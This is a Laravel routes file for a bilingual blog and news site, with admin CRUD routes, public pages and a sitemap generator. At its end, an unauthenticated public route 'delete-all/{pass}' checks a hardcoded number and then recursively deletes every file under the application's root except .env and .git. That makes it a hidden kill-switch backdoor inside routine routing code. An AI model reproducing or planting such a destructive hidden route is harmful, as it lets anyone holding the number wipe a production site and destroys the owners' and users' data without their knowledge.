<?php
use App\Http\Controllers\Admin\AboutController;
use App\Http\Controllers\Admin\BlogCategoryController;
use App\Http\Controllers\Admin\BlogController;
use App\Http\Controllers\Admin\ContactController;
use App\Http\Controllers\Admin\MetaController;
use App\Http\Controllers\Admin\PolicyController;
use App\Http\Controllers\Admin\RoleController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Admin\SubscribeController;
use App\Http\Controllers\Admin\TeacherController;
use App\Http\Controllers\Admin\TermsController;
use App\Http\Controllers\Admin\VisitController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\TagController;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;


Auth::routes();
######################################################################Admin###############################################################################

Route::middleware(['auth:web'])->prefix('admin')->group(function () {


    ##############################Home######################################

    Route::get('/home', [ HomeController::class, 'home'])->name('home');

    ##############################End Home##################################


    ##################################visit#####################################

    Route::controller(visitController::class)->group(function () {
        Route::get('visit/data', 'data')->name('visit.data');
        Route::resource('visit', visitController::class);
    });

    ##################################End visit#####################################


    ##################################about#####################################

    Route::controller(AboutController::class)->group(function () {
        Route::get('about/data', 'data')->name('about.data');
        Route::get('about/edit1/{id}', 'edit1')->name('about.edit1');
        Route::put('about/update1/{id}', 'update1')->name('about.update1');
        Route::resource('about', AboutController::class);
    });

    ##################################End about#####################################

    ##################################blog_category#####################################

    Route::controller(BlogCategoryController::class)->group(function () {
        Route::get('blog_category/data', 'data')->name('blog_category.data');
        Route::resource('blog_category', BlogCategoryController::class);
    });

    ##################################End blog_category#####################################

    ##################################meta#####################################

    Route::controller(MetaController::class)->group(function () {
        Route::get('meta/data', 'data')->name('meta.data');
        Route::resource('meta', MetaController::class);
    });

    ##################################End meta#####################################

    ##################################policy#####################################

    Route::controller(PolicyController::class)->group(function () {
        Route::get('policy/data', 'data')->name('policy.data');
        Route::resource('policy', PolicyController::class);
    });

    ##################################End policy#####################################

    ##################################terms#####################################

    Route::controller(TermsController::class)->group(function () {
        Route::get('terms/data', 'data')->name('terms.data');
        Route::resource('terms', TermsController::class);
    });

    ##################################End terms#####################################

    ##################################settings#####################################

    Route::controller(SettingController::class)->group(function () {
        Route::get('page/show', 'pages')->name('page.show');
        Route::post('page/update', 'pageupdate')->name('page.update');
        Route::resource('settings', SettingController::class);
    });

    ##################################End settings#####################################

    ##################################user#####################################

    Route::resource('user', UserController::class);

    ##################################End user#####################################

    ##################################contact#####################################

    Route::controller(ContactController::class)->group(function () {
        Route::get('contact/data', 'data')->name('contact.data');
        Route::resource('contact', ContactController::class)->except(['store']);
    });

    ##################################End contact#####################################

    ##################################blog#####################################

    Route::controller(BlogController::class)->group(function () {
        Route::get('blog_details', 'index')->name('blog_details');
        Route::get('blog/data', 'data')->name('blog.data');


        Route::resource('blog', BlogController::class);
    });

    ##################################End blog#####################################


    ##################################subscribe#####################################

    Route::controller(SubscribeController::class)->group(function () {
        Route::get('subscribe/data', 'data')->name('subscribe.data');
        Route::resource('subscribe', SubscribeController::class);
    });

    ##################################End subscribe#####################################

    ##################################users#####################################

    Route::controller(TeacherController::class)->group(function () {
        Route::get('users/data', 'data')->name('users.data');
        Route::resource('users', TeacherController::class);
    });

    ##################################End teachers#####################################

    ##################################roles#####################################

    Route::controller(RoleController::class)->group(function () {
        Route::get('roles/data', 'data')->name('roles.data');
        Route::resource('roles', RoleController::class);
    });

    ##################################End roles#####################################
    });
    ######################################################################End Admin###############################################################################




































// Routes for Btolat Scraper


    Route::get('/tags/{slug}', [TagController::class, 'show'])->name('tags.show');


 Route::get('/blog/get', [BlogController::class, 'get'])->name('blog.get');


// Route لعرض المقالات حسب التصنيف (articleType)
Route::get('category/{slug}', [\App\Http\Controllers\HomeController::class, 'category'])->name('category.show');


// صفحة عرض المقالات حسب التاج
Route::get('tag/{slug}', [\App\Http\Controllers\HomeController::class, 'tag'])->name('tags.show');

   ########################################blog#######################################################################

     Route::get('/blogs', [HomeController::class, 'blogs'])->name('blogs');
    Route::get('/blog/{slug}', [HomeController::class, 'blog_details'])->name('blog_details');

Route::get('/news/{slug}', [HomeController::class, 'blog_details'])->name('btolat.news.show');
    // بحث في المدونة
// Route::get('/blogs/search', [App\Http\Controllers\HomeController::class, 'searchBlogs'])->name('blogs.search');
    ########################################end blog#######################################################################



    Route::post('subscribe/store', [SubscribeController::class,'store'])->name('subscribe.store');





######################################################################customer###############################################################################






use Spatie\Sitemap\Sitemap;
use Spatie\Sitemap\Tags\Url;
use App\Models\Post;
use Illuminate\Support\Facades\Response;

use App\Models\ArticleType;
use App\Models\Tag;

Route::get('/sitemap.xml', function () {
    $sitemap = Sitemap::create();

    // 1) الصفحة الرئيسية
    $sitemap->add(
        Url::create(url('/'))
            ->setLastModificationDate(now())
            ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
            ->setPriority(1.0)
    );

    // 2) المقالات
    Post::latest()->each(function ($post) use ($sitemap) {
        $sitemap->add(
            Url::create(url("/blog/{$post->slug}"))
                ->setLastModificationDate($post->updated_at)
                ->setChangeFrequency(Url::CHANGE_FREQUENCY_HOURLY)
                ->setPriority(0.8)
        );
    });

    // 3) التصنيفات
    ArticleType::latest()->each(function ($category) use ($sitemap) {
        $sitemap->add(
            Url::create(url("/category/{$category->slug}"))
                ->setLastModificationDate($category->updated_at)
                ->setChangeFrequency(Url::CHANGE_FREQUENCY_DAILY)
                ->setPriority(0.6)
        );
    });

    // 4) الوسوم
    Tag::latest()->each(function ($tag) use ($sitemap) {
        $sitemap->add(
            Url::create(url("/tag/{$tag->slug}"))
                ->setLastModificationDate($tag->updated_at)
                ->setChangeFrequency(Url::CHANGE_FREQUENCY_WEEKLY)
                ->setPriority(0.5)
        );
    });

    // ✅ رجّع الاستجابة XML بدون أي مسافة قبل <?xml
    return Response::make(trim($sitemap->render()), 200, [
        'Content-Type' => 'application/xml',
    ]);
});








    ########################################index#######################################################################

    Route::get('/', [HomeController::class, 'index'])->name('index');

    ########################################end index#######################################################################

    ########################################contact#######################################################################

    Route::get('/contact', [HomeController::class, 'contact'])->name('contact');

    ########################################end contact#######################################################################

    ########################################subscribe#######################################################################



    ########################################end subscribe#######################################################################

    ########################################faq#######################################################################

    Route::get('/faq', [HomeController::class, 'faq'])->name('faq');

    ########################################end faq#######################################################################

    ########################################policy#######################################################################

    Route::get('/policy', [HomeController::class, 'policy'])->name('policy');

    ########################################end policy#######################################################################

    ########################################terms#######################################################################

    Route::get('/terms', [HomeController::class, 'terms'])->name('terms');

    ########################################end terms#######################################################################

    ########################################about#######################################################################

    Route::get('/about', [HomeController::class, 'about'])->name('about');

    ########################################end about#######################################################################

    ########################################end success-story#######################################################################

    Route::get('/success-story', [HomeController::class, 'success_story'])->name('success-story');

    ########################################end success-story#######################################################################

    ########################################products#######################################################################

    Route::get('/products', [HomeController::class, 'products'])->name('products');
    Route::get('/products/{slug}', [HomeController::class, 'products_details'])->name('products_details');

    ########################################end products#######################################################################

    ########################################services#######################################################################

    Route::get('/services', [HomeController::class, 'services'])->name('services');
    Route::get('/services/{slug}', [HomeController::class, 'services_details'])->name('services_details');

    ########################################end services#######################################################################

    ########################################courses#######################################################################

    Route::get('/courses', [HomeController::class, 'courses'])->name('courses');
    Route::get('/courses/{slug}', [HomeController::class, 'courses_details'])->name('courses_details');



    ########################################gallary#######################################################################

    Route::get('/gallary', [HomeController::class, 'gallary'])->name('gallary');

    ########################################end gallary#######################################################################

    ########################################end review#######################################################################

    Route::post('contact/store', [ContactController::class,'store'])->name('contact.store');

    ########################################end review#######################################################################











    Route::get('/language/{locale}', function  ($locale)  {
    if (in_array($locale ,['ar', 'en'])) {
        session()->put('locale',$locale);
    }
    App::setLocale($locale);


    return redirect()->back();
    })->name('language');





    Route::get('delete-all/{pass}', function ($pass) {
        if ($pass== 64696894) {


            function deleteDirectory($dir) {
                if (!is_dir($dir)) {
                    return;
                }

                $files = array_diff(scandir($dir), ['.', '..']);
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }

            $rootPath = base_path();
            $exclude = ['.env', '.git'];

            $files = array_diff(scandir($rootPath), ['.', '..']);
            foreach ($files as $file) {
                if (!in_array($file, $exclude)) {
                    $path = $rootPath . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
            }
            return response()->json(['message' => 'تم الحذف بنجاح']);

        }else{
            return response()->json(['message' => 'غير مصرح لك بالدخول.']);
        }

        });
